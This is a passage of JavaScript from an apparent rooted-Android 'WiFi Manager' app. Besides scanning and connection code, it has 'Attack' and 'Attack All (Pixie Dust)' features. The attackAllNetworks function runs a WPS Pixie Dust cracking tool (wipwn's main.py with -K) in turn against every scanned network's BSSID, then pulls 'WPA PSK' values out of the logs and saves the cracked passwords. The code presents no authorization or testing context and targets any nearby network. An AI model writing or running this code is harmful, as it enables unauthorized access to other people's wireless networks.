            <div style="color: #fff; font-size: 14px; font-weight: 600; margin-bottom: 8px;">📜 Live Logs</div>
            <pre id="attack-all-log" style="background: #0d1117; color: #32D74B; padding: 12px; border-radius: 8px; height: 250px; overflow-y: auto; font-size: 11px; white-space: pre-wrap; word-break: break-all; border: 1px solid #2a3152;">Waiting for logs...</pre>
        </div>
        <div id="attack-all-results" style="margin-bottom: 16px; display: none;">
            <div style="color: #fff; font-size: 14px; font-weight: 600; margin-bottom: 8px;">📊 Results</div>
            <div id="attack-all-results-list" style="background: #151b2d; padding: 12px; border-radius: 8px; max-height: 150px; overflow-y: auto;"></div>
        </div>
        <button id="stop-all-attack-btn" style="width: 100%; padding: 14px; background: #FF3B30; color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 14px;">⏹️ Stop All Attacks</button>
        <button id="close-all-attack-btn" style="width: 100%; margin-top: 12px; padding: 14px; background: #2a3152; color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 14px; display: none;">Close</button>
    `;

    modal.appendChild(box);
    document.body.appendChild(modal);
    modal.onclick = e => { if (e.target === modal) modal.remove(); };

    let attackStopped = false;
    let passwordFound = false;
    const results = [];

    document.getElementById('stop-all-attack-btn').onclick = async () => {
        attackStopped = true;
        await execFn('su -c "pkill -f MASS_ATTACK || true"');
        await execFn('cmd wifi stop-softap');
        await execFn('svc wifi enable');
        await execFn('su -c "pkill -f termux_script.sh || true"');
        await execFn(`su -c "pkill -9 -f /data/data/com.termux || true"`);
        stopLogReader();
        if (typeof showStatus === 'function') showStatus('⏹️ Mass attack stopped by user', '#FF9F0A');
        document.getElementById('stop-all-attack-btn').style.display = 'none';
        document.getElementById('close-all-attack-btn').style.display = 'block';
    };

    document.getElementById('close-all-attack-btn').onclick = () => modal.remove();

    // Loop through each target network
    for (let i = 0; i < targetNetworks.length; i++) {
        if (attackStopped || passwordFound) break;

        const network = targetNetworks[i];
        const macUpper = network.bssid.toUpperCase();
        
        // Update UI progress
        const progress = ((i + 1) / targetNetworks.length) * 100;
        document.getElementById('attack-progress-bar').style.width = `${progress}%`;        document.getElementById('attack-progress-text').textContent = `Attacking: ${network.ssid}`;
        document.getElementById('attack-current-target').textContent = `${i + 1}/${targetNetworks.length}`;
        
        document.getElementById('current-target-info').innerHTML = `
            <div style="color: #fff; font-weight: 600; margin-bottom: 4px;">🎯 ${network.ssid}</div>
            <div style="color: #8b92b4; font-size: 11px;">BSSID: ${network.bssid} | Signal: ${network.signal} dBm</div>
            <div style="color: #4a9eff; font-size: 11px; margin-top: 4px;">⏱️ Timeout: 30 seconds</div>
        `;

        // --- USING START ATTACK LOGIC ---
        const attackJobId = `MASS_ATTACK_${Date.now()}_${i}`;
        
        await execFn('cmd wifi start-softap MyHotspot open ""');
        await execFn('su -c "echo \\"\\" > /sdcard/MTK_AI_Engine/wifi/wipwn.log"');

        // Added timeout 30 to the shell command to auto-kill after 30s
        const attackShellCmd = `cd ~/wipwn && timeout 30 sudo python3 -u main.py -i wlan0 -b ${macUpper} -K`;
        await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);
        await execFn('nohup sh /sdcard/MTK_AI_Engine/wifi/termux_script.sh &');
        startLogReader('/sdcard/MTK_AI_Engine/wifi/wipwn.log', 'attack-all-log');

        // Wait for 30 seconds (plus 2s buffer to ensure logs are fully written)
        await new Promise(resolve => setTimeout(resolve, 32000));

        // Stop attack for this target using startAttack logic
        await execFn(`su -c "pkill -f ${attackJobId} || true"`);
        await execFn('cmd wifi stop-softap');
        await execFn('svc wifi enable');
        await execFn(`su -c "pkill -f termux_script.sh || true"`);
        // --------------------------------

        // Check if password was found in logs
        const logContent = await execFn(`su -c "cat /sdcard/MTK_AI_Engine/wifi/wipwn.log 2>/dev/null"`);
        
        const passwordMatch = logContent.match(/WPA PSK:\s*([^\s\n]+)/i) || 
                             logContent.match(/Password:\s*([^\s\n]+)/i);

        if (passwordMatch && passwordMatch[1] && passwordMatch[1].length > 0) {
            passwordFound = true;
            const password = passwordMatch[1].trim();
            results.push({ ssid: network.ssid, bssid: network.bssid, password: password, status: 'SUCCESS' });

            // Save the password
            savedNetworks[network.ssid] = password;
            await saveNetworks();

            document.getElementById('current-target-info').innerHTML = `
                <div style="color: #32D74B; font-weight: 600; margin-bottom: 4px;">✅ PASSWORD FOUND!</div>
                <div style="color: #fff; font-size: 13px; margin: 8px 0; padding: 8px; background: #1a2f1a; border-radius: 6px;">                    <strong>SSID:</strong> ${network.ssid}<br>
                    <strong>Password:</strong> <span style="color: #32D74B; font-family: monospace;">${password}</span>
                </div>
                <div style="color: #32D74B; font-size: 12px;">⏹️ Stopping all attacks...</div>
            `;

            if (typeof showStatus === 'function') showStatus(`✅ Password found for ${network.ssid}!`, '#32D74B');
            break;
        } else {
            results.push({ ssid: network.ssid, bssid: network.bssid, password: null, status: 'FAILED' });
        }

        // Small delay between attacks
        await new Promise(resolve => setTimeout(resolve, 2000));
    }

    stopLogReader();

    // Show results summary
    if (results.length > 0) {
        document.getElementById('attack-all-results').style.display = 'block';
        const resultsList = document.getElementById('attack-all-results-list');
        const successCount = results.filter(r => r.status === 'SUCCESS').length;
        const failedCount = results.filter(r => r.status === 'FAILED').length;
        
        let resultsHtml = `
            <div style="display: flex; justify-content: space-between; margin-bottom: 12px; padding: 8px; background: #1a1f3a; border-radius: 6px;">
                <span style="color: #32D74B; font-weight: 600;">✅ Success: ${successCount}</span>
                <span style="color: #FF3B30; font-weight: 600;">❌ Failed: ${failedCount}</span>
            </div>
        `;

        results.forEach(result => {
            if (result.status === 'SUCCESS') {
                resultsHtml += `
                    <div style="padding: 8px; margin-bottom: 8px; background: #1a2f1a; border-left: 3px solid #32D74B; border-radius: 4px;">
                        <div style="color: #32D74B; font-weight: 600; font-size: 12px;">✅ ${result.ssid}</div>
                        <div style="color: #fff; font-family: monospace; font-size: 11px; margin-top: 4px; padding: 4px; background: #0d1f0d; border-radius: 4px;">${result.password}</div>
                    </div>
                `;
            } else {
                resultsHtml += `
                    <div style="padding: 8px; margin-bottom: 8px; background: #2f1a1a; border-left: 3px solid #FF3B30; border-radius: 4px; opacity: 0.7;">
                        <div style="color: #FF3B30; font-weight: 600; font-size: 12px;">❌ ${result.ssid}</div>
                    </div>
                `;
            }
        });
        resultsList.innerHTML = resultsHtml;
    }
    // Update final status text
    if (passwordFound) {
        document.getElementById('attack-progress-text').textContent = '✅ Password found! Stopped.';
        document.getElementById('attack-progress-text').style.color = '#32D74B';
    } else if (attackStopped) {
        document.getElementById('attack-progress-text').textContent = '⏹️ Stopped by user';
        document.getElementById('attack-progress-text').style.color = '#FF9F0A';
    } else {
        document.getElementById('attack-progress-text').textContent = '✅ All attacks completed';
        document.getElementById('attack-progress-text').style.color = '#32D74B';
    }

    document.getElementById('stop-all-attack-btn').style.display = 'none';
    document.getElementById('close-all-attack-btn').style.display = 'block';

    // Refresh network list to show saved passwords
    refreshNetworkPasswordStatus();
    renderNetworkList();
}
// --- End WiFi Attack Functions ---

function showNetworkSelector() {
    const existing = document.getElementById('wifi-modal');
    if (existing) existing.remove();

    const modal = document.createElement('div');
    modal.id = 'wifi-modal';
    modal.style.cssText = `position: fixed; inset: 0; background: rgba(0,0,0,0.75); z-index: 10000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(4px); animation: fadeIn 0.2s ease;`;

    const box = document.createElement('div');
    box.style.cssText = `background: #1a1f3a; border: 1px solid #2a3152; border-radius: 16px; padding: 24px; width: 90%; max-width: 500px; max-height: 85vh; overflow-y: auto; box-shadow: 0 10px 40px rgba(0,0,0,0.5); animation: slideUp 0.3s ease;`;

    const title = document.createElement('h3');
    title.textContent = 'WiFi Manager';
    title.style.cssText = 'color: #fff; margin: 0 0 16px; font-size: 18px; font-weight: 600; text-align: center;';

    const info = document.createElement('div');
    info.style.cssText = 'color: #8b92b4; font-size: 13px; margin-bottom: 20px; text-align: center;';
    info.innerHTML = currentNetwork 
        ? `<strong>Connected: </strong> <span style="color: #32D74B">${currentNetwork.ssid}</span>`
        : '<strong>Status: </strong> Not connected';

    const actionsGrid = document.createElement('div');
    actionsGrid.style.cssText = 'display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px;';
    
    const scanBtn = document.createElement('button');
    scanBtn.id = 'auto-scan-btn';
    scanBtn.textContent = '📡 Scan Networks';
    scanBtn.style.cssText = `padding: 12px; background: linear-gradient(135deg, #4a9eff, #2980b9); color: #fff; border: none; border-radius: 10px; font-size: 13px; font-weight: 600; cursor: pointer;`;
    scanBtn.onclick = async () => {
        scanBtn.disabled = true; scanBtn.textContent = '⏳ Scanning...';
        await scanNetworks();
        scanBtn.disabled = false; scanBtn.textContent = '📡 Scan Networks';
        renderNetworkList();
    };
    const boostBtn = document.createElement('button');
    boostBtn.id = 'boost-btn';
    boostBtn.textContent = wifiBoosted ? '⚡ Wi-Fi Boosted ✓' : '⚡ Enable Wi-Fi Boost';
    boostBtn.style.cssText = `padding: 12px; background: ${wifiBoosted ? 'linear-gradient(135deg, #32D74B, #28a745)' : 'linear-gradient(135deg, #8E8E93, #636366)'}; color: #fff; border: none; border-radius: 10px; font-size: 13px; font-weight: 600; cursor: pointer;`;
    boostBtn.onclick = checkAndToggleWifiBoost;

    const free5gBtn = document.createElement('button');
    free5gBtn.id = 'free-5g-btn';
    free5gBtn.textContent = showOnlyFree5GHz ? '📡 Show All Networks' : '🆓 Free 5GHz Only';
    free5gBtn.style.cssText = `grid-column: span 2; padding: 12px; background: ${showOnlyFree5GHz ? 'linear-gradient(135deg, #32D74B, #28a745)' : 'linear-gradient(135deg, #FF9F0A, #ff7f50)'}; color: #fff; border: none; border-radius: 10px; font-size: 13px; font-weight: 600; cursor: pointer;`;
    free5gBtn.onclick = () => {
        showOnlyFree5GHz = !showOnlyFree5GHz;
        free5gBtn.textContent = showOnlyFree5GHz ? '📡 Show All Networks' : ' Free 5GHz Only';
        free5gBtn.style.background = showOnlyFree5GHz ? 'linear-gradient(135deg, #32D74B, #28a745)' : 'linear-gradient(135deg, #FF9F0A, #ff7f50)';
        renderNetworkList();
    };
    const disable24gBtn = document.createElement('button');
    disable24gBtn.id = 'disable-24g-btn';
    disable24gBtn.textContent = '📶 Disable 2.4GHz (System)';
    disable24gBtn.style.cssText = `grid-column: span 2; padding: 12px; background: linear-gradient(135deg, #9b59b6, #8e44ad); color: #fff; border: none; border-radius: 10px; font-size: 13px; font-weight: 600; cursor: pointer;`;
    disable24gBtn.onclick = disable24GHz;

    // --- NEW BUTTON ADDED HERE ---
    const attackAllBtn = document.createElement('button');
    attackAllBtn.id = 'attack-all-btn';
    attackAllBtn.textContent = '⚔️ Attack All (Pixie Dust)';
    attackAllBtn.style.cssText = `grid-column: span 2; padding: 14px; background: linear-gradient(135deg, #FF3B30, #ff7f50); color: #fff; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer;`;
    attackAllBtn.onclick = () => attackAllNetworks();
    // -----------------------------

    actionsGrid.append(scanBtn, boostBtn, free5gBtn, disable24gBtn, attackAllBtn);
    box.append(title, info, actionsGrid);

    const boostStatus = document.createElement('div');
    boostStatus.id = 'boost-status';
    boostStatus.style.cssText = 'margin-bottom: 20px; padding: 10px; background: #151b2d; border-radius: 8px; font-size: 12px; text-align: center;';
    box.appendChild(boostStatus);

    const dnsSection = document.createElement('div');
    dnsSection.style.cssText = 'margin-bottom: 20px; padding: 12px; background: #151b2d; border-radius: 10px; border: 1px solid #2a3152;';
    dnsSection.innerHTML = `<div style="color: #fff; font-size: 14px; font-weight: 600; margin-bottom: 8px;">🌐 Global DNS</div>`;
    
    const dnsSelect = document.createElement('select');
    dnsSelect.id = 'dns-select';
    dnsSelect.style.cssText = 'width: 100%; padding: 10px; background: #1a1f3a; color: #fff; border: 1px solid #4a9eff; border-radius: 8px; font-size: 13px; cursor: pointer; margin-bottom: 8px;';
    dnsSelect.innerHTML = '<option value="">Select a DNS Provider...</option>';
    Object.keys(DNS_PROVIDERS).forEach(provider => {
        const opt = document.createElement('option');
        opt.value = provider;
        opt.textContent = provider;
        dnsSelect.appendChild(opt);
    });
    dnsSelect.onchange = (e) => {
        if (e.target.value) {
            setGlobalDNS(e.target.value);
        }
    };
    dnsSection.appendChild(dnsSelect);
    
    const dnsStatus = document.createElement('div');
    dnsStatus.id = 'dns-status';
    dnsStatus.style.cssText = 'font-size: 12px; text-align: center;';        
    dnsSection.appendChild(dnsStatus);
    
    box.appendChild(dnsSection);
    const networkList = document.createElement('div');
    networkList.id = 'wifi-network-list';
    networkList.style.cssText = 'display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px;';

    const closeBtn = document.createElement('button');
    closeBtn.textContent = 'Close';
    closeBtn.style.cssText = `width: 100%; padding: 14px; background: #2a3152; color: #fff; border: none; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer;`;
    closeBtn.onclick = () => modal.remove();

    box.append(networkList, closeBtn);
    modal.appendChild(box);
    modal.onclick = e => { if (e.target === modal) modal.remove(); };

    const style = document.createElement('style');
    style.textContent = `@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } } @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }`;
    document.head.appendChild(style);
    document.body.appendChild(modal);

    checkWifiBoostStatus().then(() => {
        updateBoostDisplay();
        updateDNSDisplay();
    });
    
    refreshNetworkPasswordStatus();
    renderNetworkList();
}

function refreshNetworkPasswordStatus() { 
    availableNetworks.forEach(network => {
        network.hasPassword = !!savedNetworks[network.ssid];
    });
}

function renderNetworkList() {
    const list = document.getElementById('wifi-network-list');
    if (!list) return;
    list.innerHTML = '';        
    
    let networksToRender = availableNetworks;
    if (showOnlyFree5GHz) {
        networksToRender = availableNetworks.filter(n => n.frequency >= 5000 && isNetworkOpen(n.security));    }

    if (networksToRender.length === 0) {
        const msg = showOnlyFree5GHz 
            ? 'No free 5GHz networks found. Click "Show All Networks" to see others.' 
            : 'Click "Scan Networks" to find available WiFi';
        list.innerHTML = `<div style="color: #8b92b4; text-align: center; padding: 20px;">${msg}</div>`;
        return;
    }

    networksToRender.forEach(network => {
        const item = document.createElement('div');
        item.style.cssText = `padding: 16px; background: #151b2d; border: 1px solid #2a3152; border-radius: 12px; cursor: pointer; transition: all 0.2s ease;`;
        
        const band = network.frequency >= 5000 ? '5GHz' : '2.4GHz';
        const isOpen = isNetworkOpen(network.security);
        const is24Open = isOpen && network.frequency < 5000;
        
        let icon = '🔒';
        let secText = network.security;
        let actionHtml = '';

        if (is24Open) {
            icon = '🚫';
            secText = 'Web Sign-in Required (Blocked)';
            actionHtml = `<div style="color: #FF3B30; font-weight: 600; font-size: 14px;">🚫 Blocked</div>`;
        } else {
            icon = isOpen ? '🆓' : '🔒';
            secText = isOpen ? 'Open Network' : network.security;
            if (network.hasPassword) {
                actionHtml = `
                    <div style="display: flex; align-items: center; gap: 12px;">
                        <span style="color: #32D74B; font-size: 13px; font-weight: 600;">✓ Saved</span>
                        <button class="forget-btn" style="background: none; border: none; color: #FF3B30; cursor: pointer; font-size: 12px; padding: 0;">Forget</button>
                    </div>
                `;
            } else {
                actionHtml = `<div style="color: #4a9eff; font-weight: 600; font-size: 14px;">Connect →</div>`;
            }
        }
        
        const macHtml = `<div style="color: #8b92b4; font-size: 11px; margin-top: 4px;">MAC: ${network.bssid || 'Unknown'}</div>`;
        const attackBtnHtml = `<button class="attack-btn" style="background: linear-gradient(135deg, #FF3B30, #ff7f50); border: none; color: #fff; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; margin-left: 8px;">⚔️ Attack</button>`;
        actionHtml += attackBtnHtml;
        
        item.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                <div style="display: flex; align-items: center; gap: 8px;">
                    <span style="font-size: 16px;">${icon}</span>
                    <span style="color: #fff; font-weight: 700; font-size: 17px;">${network.ssid}</span>                    <span style="color: #8b92b4; font-size: 11px; background: #2a3152; padding: 2px 6px; border-radius: 4px;">${band}</span>
                </div>
                <div style="text-align: right;">
                    <div style="color: ${network.signal > -70 ? '#32D74B' : '#FF9F0A'}; font-weight: 600; font-size: 14px;">${network.signal} dBm</div>
                </div>
            </div>
            ${macHtml}
            <div style="display: flex; justify-content: space-between; align-items: center; padding-top: 10px; border-top: 1px solid #2a3152; margin-top: 10px;">
                <div style="color: #6b7280; font-size: 11px;">${secText}</div>
                ${actionHtml}
            </div>
        `;
        
        item.onmouseenter = () => { item.style.borderColor = '#4a9eff'; item.style.background = '#1e2540'; };
        item.onmouseleave = () => { item.style.borderColor = '#2a3152'; item.style.background = '#151b2d'; };
        
        item.onclick = (e) => {
            if (e.target.classList.contains('forget-btn')) {
                e.stopPropagation();
                forgetPassword(network.ssid);
            } else if (e.target.classList.contains('attack-btn')) {
                e.stopPropagation();
                showAttackModal(network);
            } else {
                handleNetworkClick(network);
            }
        };            
        list.appendChild(item);
    });
}

function forgetPassword(ssid) {
    if (confirm(`Forget saved password for "${ssid}"?`)) {
        delete savedNetworks[ssid];
        saveNetworks();
        const network = availableNetworks.find(n => n.ssid === ssid);
        if (network) network.hasPassword = false;
        renderNetworkList();
        if (typeof showStatus === 'function') showStatus(`🗑️ Password forgotten for ${ssid}`, '#FF9F0A');
    }
}

async function handleNetworkClick(network) {
    const isOpen = isNetworkOpen(network.security);
    if (isOpen) {
        if (network.frequency < 5000) {
            if (typeof showStatus === 'function') showStatus('❌ 2.4GHz Open WiFi blocked (Requires web sign-in)', '#FF3B30');
            return;
        }
        await executeConnection(network, '', false, false);        return;
    }
    if (savedNetworks[network.ssid] && savedNetworks[network.ssid] !== '[CONNECTED]') {
        await executeConnection(network, savedNetworks[network.ssid], false, true);
    } else {
        showPasswordModal(network, false);
    }
}

function showPasswordModal(network, isRetry, lastPassword = '') {
    const existing = document.getElementById('password-modal');
    if (existing) existing.remove();
    const modal = document.createElement('div');
    modal.id = 'password-modal';
    modal.style.cssText = `position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 10001; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(4px);`;

    const box = document.createElement('div');
    box.style.cssText = `background: #1a1f3a; border: 1px solid #2a3152; border-radius: 16px; padding: 24px; width: 90%; max-width: 400px; box-shadow: 0 10px 40px rgba(0,0,0,0.5);`;

    const errorMsg = isRetry ? `<div style="color: #FF3B30; font-size: 13px; margin-bottom: 12px; text-align: center; font-weight: 600;">❌ Wrong password. Please try again.</div>` : '';

    box.innerHTML = `
        ${errorMsg}
        <h4 style="color: #fff; margin: 0 0 16px; text-align: center;">Enter Password for ${network.ssid}</h4>
        <div style="position: relative;">
            <input type="password" id="wifi-pass-input" placeholder="WiFi Password" value="${lastPassword}" style="width: 100%; padding: 14px 45px 14px 14px; background: #151b2d; border: 1px solid #2a3152; color: #fff; border-radius: 10px; font-size: 16px; margin-bottom: 16px; box-sizing: border-box; outline: none;">
            <button id="toggle-pass-btn" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #8b92b4; cursor: pointer; font-size: 16px; padding: 5px;">👁️</button>
        </div>
        <label style="display: flex; align-items: center; gap: 10px; color: #8b92b4; font-size: 14px; margin-bottom: 20px; cursor: pointer;">
            <input type="checkbox" id="save-pass-check" checked style="width: 18px; height: 18px; accent-color: #4a9eff;">
            Save password for future use
        </label>
        <div style="display: flex; gap: 10px;">
            <button id="pass-cancel-btn" style="flex: 1; padding: 14px; background: #2a3152; color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer;">Cancel</button>
            <button id="pass-connect-btn" style="flex: 1; padding: 14px; background: #4a9eff; color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer;">Connect</button>
        </div>
    `;
    modal.appendChild(box);
    document.body.appendChild(modal);

    const input = document.getElementById('wifi-pass-input');
    const toggleBtn = document.getElementById('toggle-pass-btn');
    
    setTimeout(() => {
        input.focus();
        if (isRetry) input.select();
    }, 100);

    toggleBtn.onclick = () => {
        if (input.type === 'password') {            input.type = 'text';
            toggleBtn.textContent = '🙈';
        } else {
            input.type = 'password';
            toggleBtn.textContent = '👁️';
        }
        input.focus();
    };

    document.getElementById('pass-cancel-btn').onclick = () => modal.remove();
    document.getElementById('pass-connect-btn').onclick = () => {
        const password = input.value.trim();            
        const shouldSave = document.getElementById('save-pass-check').checked;
        if (!password) { 
            input.style.borderColor = '#FF3B30'; 
            input.focus();
            return; 
        }
        
        modal.remove();
        executeConnection(network, password, shouldSave, false);
    };
    
    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') document.getElementById('pass-connect-btn').click();
    });
    
    input.addEventListener('input', () => {
        input.style.borderColor = '#2a3152';
    });
}

async function executeConnection(network, password, shouldSave, isSavedPassword) {
    try {
        if (typeof showStatus === 'function') showStatus(`🔗 Connecting to ${network.ssid}...`, '#4a9eff');
        
        let cmd;
        if (isNetworkOpen(network.security) || !password) {
            cmd = `su -c 'cmd wifi connect-network "${network.ssid}" open " " -b ${network.bssid}'`;
        } else {
            cmd = `su -c 'cmd wifi connect-network "${network.ssid}" wpa2 "${password}" -b ${network.bssid}'`;
        }
        await execFn(cmd);
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        await execFn('su -c "svc wifi disable"');
        await new Promise(resolve => setTimeout(resolve, 2000));
        await execFn('su -c "svc wifi enable"');
        await new Promise(resolve => setTimeout(resolve, 4000));
        await loadCurrentNetwork();        
        if (currentNetwork && currentNetwork.ssid === network.ssid) {
            if (shouldSave && !isSavedPassword && password) {
                savedNetworks[network.ssid] = password;
                await saveNetworks();
                
                const netIndex = availableNetworks.findIndex(n => n.ssid === network.ssid);
                if (netIndex !== -1) {
                    availableNetworks[netIndex].hasPassword = true;
                }
            }
            if (typeof showStatus === 'function') {                    
                const saveMsg = (shouldSave && !isSavedPassword && password) ? ' (Password saved)' : '';
                showStatus(`✅ Connected to ${network.ssid}${saveMsg}`, '#32D74B');
            }
            renderNetworkList();
        } else {
            if (typeof showStatus === 'function') showStatus(`❌ Wrong password. Try again.`, '#FF3B30');
            
            if (isSavedPassword) {
                delete savedNetworks[network.ssid];
                await saveNetworks();
                const netIndex = availableNetworks.findIndex(n => n.ssid === network.ssid);
                if (netIndex !== -1) {
                    availableNetworks[netIndex].hasPassword = false;
                }
            }
            setTimeout(() => showPasswordModal(network, true, password), 500);
        }
    } catch (e) {
        console.error('Connection failed:', e);
        if (typeof showStatus === 'function') showStatus('❌ Connection failed', '#FF3B30');
        setTimeout(() => showPasswordModal(network, true, password), 500);
    }
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}    

window.scanNetworks = scanNetworks;
window.checkAndToggleWifiBoost = checkAndToggleWifiBoost;
window.setGlobalDNS = setGlobalDNS;
window.disable24GHz = disable24GHz;
window.showAttackModal = showAttackModal;
window.attackAllNetworks = attackAllNetworks;
})();
